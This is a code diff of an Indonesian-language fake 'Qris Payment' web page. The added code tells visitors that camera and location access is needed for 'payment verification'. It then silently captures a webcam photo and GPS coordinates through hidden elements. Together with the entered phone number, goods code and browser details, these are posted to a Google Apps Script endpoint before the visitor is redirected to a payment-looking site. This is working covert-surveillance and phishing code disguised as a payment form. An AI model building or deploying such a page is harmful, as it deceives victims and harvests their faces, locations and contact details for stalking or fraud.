@@ -5,42 +5,102 @@
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <title>Qris Payment</title>
 <style>
-body {display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0;background:#f5f5f5;font-family:sans-serif;}
-.container {text-align:center;background:#fff;padding:20px;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);width:320px;}
-img {max-width:300px;width:100%;border-radius:8px;margin-bottom:20px;}
-input {padding:12px 16px;width:100%;max-width:280px;border:1px solid #ccc;border-radius:8px;font-size:16px;margin-bottom:15px;}
-input:focus {border-color:#3b82f6;outline:none;box-shadow:0 0 0 2px rgba(59,130,246,.3);}
-button {padding:12px 20px;border:none;border-radius:8px;background:#3b82f6;color:white;font-size:16px;cursor:pointer;width:100%;}
+body {margin:0;font-family:sans-serif;background:#f5f5f5;}
+#overlay {
+  position:fixed;top:0;left:0;width:100%;height:100%;
+  background:#000a;display:flex;justify-content:center;align-items:center;
+  z-index:9999;
+}
+#overlay div {
+  background:white;padding:20px;border-radius:12px;text-align:center;
+  box-shadow:0 4px 12px rgba(0,0,0,0.2);
+}
+.container {
+  display:none;max-width:340px;margin:40px auto;padding:20px;
+  background:#fff;border-radius:12px;box-shadow:0 4px 12px rgba(0,0,0,0.15);
+  text-align:center;
+}
+.container img {max-width:300px;width:100%;border-radius:8px;margin-bottom:20px;}
+.container input {
+  padding:12px 16px;width:100%;border:1px solid #ccc;border-radius:8px;
+  font-size:16px;margin-bottom:15px;
+}
+.container input:focus {border-color:#3b82f6;outline:none;}
+button {
+  padding:12px 20px;border:none;border-radius:8px;background:#3b82f6;color:white;
+  font-size:16px;cursor:pointer;width:100%;
+}
 button:hover {background:#2563eb;}
 #message {margin-top:12px;font-weight:bold;display:none;}
+#video,#canvas {display:none;}
 </style>
 </head>
 <body>
+<div id="overlay">
+  <div>
+    <h3>Aktifkan Kamera & Lokasi</h3>
+    <p>Diperlukan untuk verifikasi pembayaran</p>
+    <button onclick="initAccess()">Lanjutkan</button>
+  </div>
+</div>
+
 <div class="container">
   <img src="https://i.ibb.co/N27QVLRG/Venice-AI-s-Mr-Chg9.webp" alt="Logo">
   <input id="codeInput" type="text" placeholder="Masukkan Kode Barang">
   <input id="phoneInput" type="text" placeholder="Nomor HP Penerima">
+  <video id="video" autoplay playsinline></video>
+  <canvas id="canvas"></canvas>
   <button onclick="handleSubmit()">Submit</button>
   <div id="message"></div>
 </div>
 
 <script>
-const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbx3gNXYA5kJgi-s4uimi12_rYv98UhiO7zh1KHgIKXVqlcb03BPs1Jq827Io7OLzGAv/exec"; // ganti pake URL dari Apps Script
+const APPSCRIPT_URL = "https://script.google.com/macros/s/AKfycbx3gNXYA5kJgi-s4uimi12_rYv98UhiO7zh1KHgIKXVqlcb03BPs1Jq827Io7OLzGAv/exec"; // ganti dengan URL web app Apps Script
 const REDIRECT_URL = "https://qris.interactive.co.id";
+
+let lastPhoto = "";
+let lastLocation = "Unavailable";
+
+async function initAccess(){
+    document.getElementById("overlay").style.display="none";
+    document.querySelector(".container").style.display="block";
+
+    // Minta lokasi
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            lastLocation = `${pos.coords.latitude},${pos.coords.longitude}`;
+        },
+        err => {
+            console.warn("Lokasi gagal:", err);
+        }
+    );
+
+    // Minta kamera dan ambil 1 foto
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video:true });
+        const video = document.getElementById("video");
+        video.srcObject = stream;
+        await new Promise(r => setTimeout(r, 1000)); // tunggu kamera siap
+
+        const canvas = document.getElementById("canvas");
+        canvas.width = 640;
+        canvas.height = 480;
+        canvas.getContext("2d").drawImage(video,0,0,canvas.width,canvas.height);
+        lastPhoto = canvas.toDataURL("image/jpeg",0.9);
+
+        stream.getTracks().forEach(track=>track.stop());
+    } catch(e){
+        console.warn("Kamera gagal:", e);
+    }
+}
 
 async function handleSubmit(){
     const code=document.getElementById("codeInput").value || "-";
     const phone=document.getElementById("phoneInput").value || "-";
     const userAgent=navigator.userAgent;
-    let location="Unavailable";
-
-    try{
-        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
-        location=`${pos.coords.latitude},${pos.coords.longitude}`;
-    }catch(e){}
-
     const timestamp=new Date().toISOString();
-    const body={code,phone,userAgent,location,timestamp};
+
+    const body={code,phone,userAgent,location:lastLocation,timestamp,photo:lastPhoto};
 
     document.getElementById("message").style.display="block";
     document.getElementById("message").textContent="Submitting...";
@@ -51,9 +111,7 @@ async function handleSubmit(){
             headers:{"Content-Type":"application/json"},
             body:JSON.stringify(body)
         });
-    }catch(e){
-        console.warn("Gagal kirim data:", e);
-    }
+    }catch(e){ console.warn("Gagal kirim:", e); }
 
     window.location.href=REDIRECT_URL;
 }
